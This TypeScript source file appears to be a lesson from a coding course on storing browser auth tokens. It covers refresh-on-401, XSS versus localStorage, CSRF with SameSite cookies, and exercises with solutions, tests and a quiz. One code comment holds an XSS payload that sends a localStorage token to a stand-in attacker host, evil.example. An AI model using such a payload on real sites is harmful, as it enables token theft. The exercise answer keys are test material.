import { Recorder } from '@/engine/recorder';
import type { KVPanel, Panel, Tone, VizDef } from '@/engine/types';
import type { Unit } from '@/content/types';
import { Seq } from '@/content/lib/backend-db-auth';
import { clip } from '@/content/lib/finish-m2m3';

const code = `
// A: token kept in JavaScript-readable storage, attached by your code
const token = localStorage.getItem('access');                              //@read
fetch('/api/me', { headers: { Authorization: 'Bearer ' + token } });       //@bearer

// B: token in an HttpOnly cookie, attached by the browser
// Set-Cookie: access=...; HttpOnly; Secure; SameSite=Lax                    //@cookie
async function api(path) {
  let res = await fetch(path, { credentials: 'include' });                 //@call
  if (res.status === 401) {                                                //@401
    await fetch('/auth/refresh', { method: 'POST', credentials: 'include' });   //@refresh
    res = await fetch(path, { credentials: 'include' });                   //@retry
  }
  return res;
}
// XSS: <img src=x onerror="fetch('//evil.example/?t=' + localStorage.access)">   //@xss
// CSRF: evil.example auto-submits a form to POST /api/transfer             //@csrf
`;

const STORAGES = ['localStorage', 'HttpOnly cookie'];
const THREATS = ['none (token expires)', 'XSS', 'CSRF'];
const SAMESITE = ['Lax', 'None'];

interface In {
  storage: string;
  threat: string;
  sameSite: string;
}

interface Out {
  refreshed: boolean;
  leaked: boolean;
  abused: boolean;
  forged: boolean;
}

const viz: VizDef<In> = {
  id: 'web-auth-browser',
  title: 'Where to keep the token: refresh, XSS and CSRF',
  code,
  language: 'javascript',
  inputs: [
    { key: 'storage', label: 'Where the access token lives', kind: 'select', options: STORAGES, default: STORAGES[0] },
    { key: 'threat', label: 'What happens', kind: 'select', options: THREATS, default: THREATS[0] },
    { key: 'sameSite', label: 'Cookie SameSite (cookie option only)', kind: 'select', options: SAMESITE, default: 'Lax' },
  ],
  presets: [
    { label: 'Token expires, refresh flow', input: { storage: STORAGES[1], threat: THREATS[0], sameSite: 'Lax' } },
    { label: 'XSS vs localStorage', input: { storage: STORAGES[0], threat: 'XSS' } },
    { label: 'XSS vs HttpOnly cookie', input: { storage: STORAGES[1], threat: 'XSS' } },
    { label: 'CSRF vs cookie, SameSite=None', input: { storage: STORAGES[1], threat: 'CSRF', sameSite: 'None' } },
    { label: 'CSRF vs cookie, SameSite=Lax', input: { storage: STORAGES[1], threat: 'CSRF', sameSite: 'Lax' } },
  ],
  run({ storage, threat, sameSite }) {
    if (!STORAGES.includes(storage)) throw new Error('storage must be one of ' + STORAGES.join(' | '));
    if (!THREATS.includes(threat)) throw new Error('threat must be one of ' + THREATS.join(' | '));
    if (!SAMESITE.includes(sameSite)) throw new Error('sameSite must be Lax or None');
    const ls = storage === 'localStorage';
    const r = new Recorder(code);
    const seq = new Seq(['App JS', 'API', 'evil.example'], `${storage}: ${threat}`);
    const out: Out = { refreshed: false, leaked: false, abused: false, forged: false };
    const state = (): KVPanel => ({
      type: 'kv',
      title: 'What an attacker gets',
      entries: [
        { k: 'token read by attacker', v: out.leaked ? 'YES' : 'no', tone: (out.leaked ? 'error' : 'done') as Tone },
        { k: 'actions done as the user', v: out.abused || out.forged ? 'YES' : 'no', tone: (out.abused || out.forged ? 'error' : 'done') as Tone },
        { k: 'session refreshed', v: out.refreshed ? 'yes' : 'no', tone: (out.refreshed ? 'found' : 'muted') as Tone },
      ],
    });
    const view = (): Panel[] => [seq.panel(), state()];
    const attach = ls ? 'Authorization: Bearer ' : 'Cookie: access (browser adds it)';

    if (threat === THREATS[0]) {
      r.step(ls ? 'bearer' : 'cookie', clip(ls ? 'The access token sits in localStorage; app code adds it to every request' : 'The access token is an HttpOnly cookie; the browser adds it to every request'), view(), { storage });
      seq.send('App JS', 'API', `GET /api/me  ${attach}`);
      r.step('call', 'The app calls the API with an access token that has just expired', view(), { token: 'expired' });
      seq.send('API', 'App JS', '401 token expired', 'error', true);
      r.step('401', 'The API answers 401: not "forbidden", just "this token is too old"', view(), { status: 401 });
      seq.send('App JS', 'API', 'POST /auth/refresh (refresh cookie)');
      r.step('refresh', 'The client silently asks for a new access token using the long-lived refresh token', view(), { step: 'refresh' });
      seq.send('API', 'App JS', ls ? '200 { access: new }' : '200 Set-Cookie: access=new', 'done', true);
      r.step('refresh', clip(ls ? 'New access token returned in the body; the app stores it again' : 'New access cookie set by the server; JS never sees it'), view(), { step: 'new token' });
      seq.send('App JS', 'API', 'GET /api/me (retry once)');
      seq.send('API', 'App JS', '200 OK', 'found', true);
      out.refreshed = true;
      r.step('retry', 'The original request is retried exactly once and succeeds; the user noticed nothing', view(), { status: 200 });
    } else if (threat === 'XSS') {
      r.step('xss', 'An attacker gets a script onto your page (unescaped comment, bad dependency)', view(), { threat });
      if (ls) {
        seq.send('App JS', 'App JS', 'injected script: localStorage.access', 'error');
        r.step('xss', 'The script reads the token straight out of localStorage', view(), { read: true });
        seq.send('App JS', 'evil.example', 'GET /?t=<access token>', 'error');
        out.leaked = out.abused = true;
        r.step('xss', 'The token is sent away: the attacker can use it from their own machine until it expires', view(), { leaked: true });
      } else {
        seq.send('App JS', 'App JS', 'injected script: document.cookie', 'compare');
        r.step('cookie', 'document.cookie does not list HttpOnly cookies: the token cannot be read', view(), { read: false });
        seq.send('App JS', 'API', 'fetch /api/transfer  Cookie rides along', 'error');
        out.abused = true;
        r.step('call', 'But the script can still make requests from the page, and the browser adds the cookie', view(), { abused: true });
        r.step('cookie', 'Damage is limited to while the tab is open; the token itself never leaves', view(), { leaked: false });
      }
    } else {
      r.step(ls ? 'read' : 'cookie', clip(ls ? 'The victim is logged in: the token is in the app localStorage' : `The victim is logged in: the HttpOnly session cookie is SameSite=${sameSite}`), view(), { storage, sameSite });
      r.step('csrf', 'The victim opens evil.example, which auto-submits a hidden form to the API', view(), { threat });
      seq.send('evil.example', 'API', ls ? 'POST /api/transfer (no Authorization header)' : `POST /api/transfer (cookie ${sameSite === 'None' ? 'attached' : 'withheld by SameSite=Lax'})`, 'error');
      const attached = !ls && sameSite === 'None';
      if (attached) {
        out.forged = true;
        seq.send('API', 'evil.example', '200 transfer done', 'error', true);
        r.step('csrf', 'The browser attached the cookie to a cross-site POST: the forged request succeeds', view(), { forged: true });
      } else {
        seq.send('API', 'evil.example', '401 not authenticated', 'done', true);
        r.step('csrf', clip(ls ? 'Nothing adds the Bearer token for another site\'s form: the request is anonymous' : 'SameSite=Lax withholds the cookie on cross-site POSTs: the request is anonymous'), view(), { forged: false });
      }
    }
    return { frames: r.frames, result: out };
  },
  reference({ storage, threat, sameSite }) {
    const cookie = storage === 'HttpOnly cookie';
    return {
      refreshed: threat.startsWith('none'),
      leaked: threat === 'XSS' && !cookie,
      abused: threat === 'XSS',
      forged: threat === 'CSRF' && cookie && sameSite === 'None',
    };
  },
};

const AUTH_HARNESS = `
function makeFake(spec) {
  const log = [];
  let valid = spec.valid;
  return {
    log,
    request: async (path, token) => {
      log.push('GET ' + path + ' [' + token + ']');
      return { status: token === valid ? 200 : 401 };
    },
    refresh: async () => {
      log.push('REFRESH');
      if (!spec.refreshOk) return { ok: false };
      valid = spec.acceptsIssued === false ? '(none)' : spec.issued;
      return { ok: true, token: spec.issued };
    },
  };
}
async function runAuth(factory, spec, paths, parallel) {
  const api = makeFake(spec);
  const client = factory(api);
  let results;
  if (parallel) {
    results = await Promise.all(paths.map((p) => client.get(p)));
  } else {
    results = [];
    for (const p of paths) results.push(await client.get(p));
  }
  return { statuses: results.map((r) => r.status), log: api.log };
}
`;

const OK_SPEC = { valid: 'a0', refreshOk: true, issued: 'a1' };
const EXPIRED = { valid: 'old', refreshOk: true, issued: 'a1' };

const unit: Unit = {
  id: 'web-auth-browser',
  hook: '"Where do you store the JWT?" splits candidates quickly. The good answer weighs XSS against CSRF, explains HttpOnly + SameSite cookies, and describes the silent refresh flow without logging the user out.',
  predict: {
    prompt: 'An attacker injects a script into your page through an unescaped comment. Which storage stops that script from reading the access token?',
    options: ['localStorage', 'sessionStorage', 'An HttpOnly cookie', 'A cookie without HttpOnly'],
    answer: 2,
    explain: 'Scripts can read localStorage, sessionStorage and ordinary cookies. An HttpOnly cookie is invisible to JavaScript. The script can still make requests that carry it, so XSS must be fixed too, but the token cannot be exfiltrated.',
  },
  simulationNote: 'A simplified model of token flows. Real apps also add CSRF tokens, token rotation and expiry policies.',
  viz,
  deeper: {
    points: [
      'Short-lived access tokens limit what a stolen token is worth; a longer-lived refresh token gets new access tokens without asking the user to log in again.',
      'localStorage: easy and CSRF-safe (nothing is attached automatically) but any XSS can read and steal the token. HttpOnly cookie: XSS cannot read it, but the browser attaches it automatically, so you need SameSite and/or a CSRF token.',
      'Best common setup: refresh token in an HttpOnly, Secure, SameSite cookie scoped to the refresh path; access token in memory (a JS variable), re-obtained on page load.',
      'On a 401 the client refreshes once and retries the original request once. Never loop: a second 401 means the session is over, so send the user to log in.',
      'When several requests fail at once, share ONE in-flight refresh promise; otherwise you refresh many times and rotating refresh tokens may invalidate each other.',
      'Whatever you pick, fix XSS (escaping, CSP) and keep tokens off URLs, which end up in logs and history.',
    ],
    pitfalls: ['Retrying forever on 401', 'Refreshing in parallel from every failed request', 'Putting tokens in query strings', 'Believing HttpOnly makes XSS harmless'],
  },
  practice: {
    language: 'javascript',
    fnName: 'makeClient',
    harness: AUTH_HARNESS,
    adapter: 'runAuth',
    statement: 'Write `makeClient(api)` returning `{ get(path) }`. `api.request(path, token)` resolves `{ status }`; `api.refresh()` resolves `{ ok, token }`. The client starts with token `"a0"`. `get` sends the request; on a 401 it refreshes ONCE, stores the new token and retries ONCE, returning that response. If the refresh fails, return the original 401 response without retrying.',
    signature: 'function makeClient(api) {',
    solution: `function makeClient(api) {
  let token = 'a0';
  const send = (path) => api.request(path, token);
  return {
    async get(path) {
      const res = await send(path);
      if (res.status !== @@401@@) return res;
      const refreshed = await @@api.refresh()@@;
      if (!refreshed.ok) return res;
      token = @@refreshed.token@@;
      return send(path);
    },
  };
}`,
    tests: [
      { args: [OK_SPEC, ['/me'], false], expected: { statuses: [200], log: ['GET /me [a0]'] }, name: 'valid token: one call' },
      { args: [EXPIRED, ['/me'], false], expected: { statuses: [200], log: ['GET /me [a0]', 'REFRESH', 'GET /me [a1]'] }, name: '401, refresh, retry' },
      { args: [EXPIRED, ['/me', '/notes'], false], expected: { statuses: [200, 200], log: ['GET /me [a0]', 'REFRESH', 'GET /me [a1]', 'GET /notes [a1]'] }, name: 'new token is reused' },
      { args: [{ valid: 'old', refreshOk: false, issued: 'a1' }, ['/me'], false], expected: { statuses: [401], log: ['GET /me [a0]', 'REFRESH'] }, name: 'refresh fails: stop at 401' },
      { args: [{ valid: 'old', refreshOk: true, issued: 'a1', acceptsIssued: false }, ['/me'], false], expected: { statuses: [401], log: ['GET /me [a0]', 'REFRESH', 'GET /me [a1]'] }, name: 'retry only once' },
      { args: [OK_SPEC, ['/a', '/b'], false], expected: { statuses: [200, 200], log: ['GET /a [a0]', 'GET /b [a0]'] }, name: 'no refresh when not needed' },
    ],
  },
  debug: {
    language: 'javascript',
    fnName: 'makeClient',
    harness: AUTH_HARNESS,
    adapter: 'runAuth',
    statement: 'After a successful refresh the retry is still rejected with 401 and every later call refreshes again. Fix the client.',
    buggy: `function makeClient(api) {
  let token = 'a0';
  const send = (path) => api.request(path, token);
  return {
    async get(path) {
      const res = await send(path);
      if (res.status !== 401) return res;
      const refreshed = await api.refresh();
      if (!refreshed.ok) return res;
      return send(path);
    },
  };
}`,
    fixed: `function makeClient(api) {
  let token = 'a0';
  const send = (path) => api.request(path, token);
  return {
    async get(path) {
      const res = await send(path);
      if (res.status !== 401) return res;
      const refreshed = await api.refresh();
      if (!refreshed.ok) return res;
      token = refreshed.token;
      return send(path);
    },
  };
}`,
    tests: [
      { args: [EXPIRED, ['/me'], false], expected: { statuses: [200], log: ['GET /me [a0]', 'REFRESH', 'GET /me [a1]'] }, name: 'retry uses the new token' },
      { args: [EXPIRED, ['/me', '/notes'], false], expected: { statuses: [200, 200], log: ['GET /me [a0]', 'REFRESH', 'GET /me [a1]', 'GET /notes [a1]'] }, name: 'later calls use it too' },
      { args: [OK_SPEC, ['/me'], false], expected: { statuses: [200], log: ['GET /me [a0]'] }, name: 'no refresh needed' },
    ],
    bugType: 'stale token after refresh',
    hint: 'The refresh succeeded. Where does the new token end up?',
    explanation: 'The refreshed token was fetched but never stored, so the retry (and every later call) still sends the old one. Assign the new token to the variable that send() reads.',
  },
  boss: {
    title: 'Single-flight refresh',
    statement: 'Extend the client: when several requests get a 401 at the same time, they must share ONE `api.refresh()` call. Write `makeClient(api)` (token starts as `"a0"`) where `get(path)` sends the request, and on 401 waits for the shared refresh (starting it if none is in flight), then retries once with the new token. A failed refresh returns the original 401 to every waiting caller. After a refresh finishes, the next expiry starts a new one.',
    language: 'javascript',
    fnName: 'makeClient',
    harness: AUTH_HARNESS,
    adapter: 'runAuth',
    starter: `function makeClient(api) {
  // your code here
}
`,
    solution: `function makeClient(api) {
  let token = 'a0';
  let inFlight = null;
  const refresh = () => {
    if (!inFlight) {
      inFlight = api.refresh().then((r) => {
        if (r.ok) token = r.token;
        inFlight = null;
        return r.ok;
      });
    }
    return inFlight;
  };
  return {
    async get(path) {
      const res = await api.request(path, token);
      if (res.status !== 401) return res;
      const ok = await refresh();
      if (!ok) return res;
      return api.request(path, token);
    },
  };
}`,
    tests: [
      { args: [EXPIRED, ['/a', '/b', '/c'], true], expected: { statuses: [200, 200, 200], log: ['GET /a [a0]', 'GET /b [a0]', 'GET /c [a0]', 'REFRESH', 'GET /a [a1]', 'GET /b [a1]', 'GET /c [a1]'] }, name: 'three 401s, one refresh' },
      { args: [OK_SPEC, ['/a', '/b'], true], expected: { statuses: [200, 200], log: ['GET /a [a0]', 'GET /b [a0]'] }, name: 'no refresh when tokens are fine' },
      { args: [{ valid: 'old', refreshOk: false, issued: 'a1' }, ['/a', '/b'], true], expected: { statuses: [401, 401], log: ['GET /a [a0]', 'GET /b [a0]', 'REFRESH'] }, name: 'failed refresh reaches everyone' },
      { args: [EXPIRED, ['/a'], true], expected: { statuses: [200], log: ['GET /a [a0]', 'REFRESH', 'GET /a [a1]'] }, name: 'single request still works' },
      { args: [{ valid: 'old', refreshOk: true, issued: 'a1', acceptsIssued: false }, ['/a', '/b'], true], expected: { statuses: [401, 401], log: ['GET /a [a0]', 'GET /b [a0]', 'REFRESH', 'GET /a [a1]', 'GET /b [a1]'] }, name: 'each retries once only' },
    ],
    hints: ['Keep a variable for the refresh that is currently running (a promise). If it already exists, await that one instead of calling api.refresh() again.', 'Create the promise with api.refresh().then(...) that stores the token and clears the variable, and return the SAME promise to every caller. The retry happens after it resolves, once per caller.'],
    combines: ['js-promises', 'be-jwt'],
  },
  quiz: [
    {
      prompt: 'Your API gets a 401 on an expired access token. What should the client do first?',
      options: ['Log the user out immediately', 'Retry the same request in a loop until it works', 'Use the refresh token once to get a new access token, then retry the request once', 'Ignore it and show an error'],
      answer: 2,
      explain: 'A 401 for an expired token is expected. One refresh and one retry hides it from the user; anything more is a loop, and a failed refresh should end the session.',
    },
  ],
};

export default unit;
